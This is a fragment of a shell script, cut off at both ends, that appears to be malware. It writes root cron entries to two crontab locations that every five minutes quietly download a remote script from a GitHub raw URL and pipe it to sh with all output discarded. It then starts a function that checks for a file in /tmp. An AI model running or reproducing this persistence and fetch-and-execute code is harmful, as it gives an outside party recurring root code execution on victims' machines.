...
echo "*/5 * * * * nohup curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh >/dev/null 2>&1 &" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * nohup curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh >/dev/null 2>&1 &" > /var/spool/cron/crontabs/root
Doc2l()
{
if [ ! -f "/tmp/c2l" ]; then
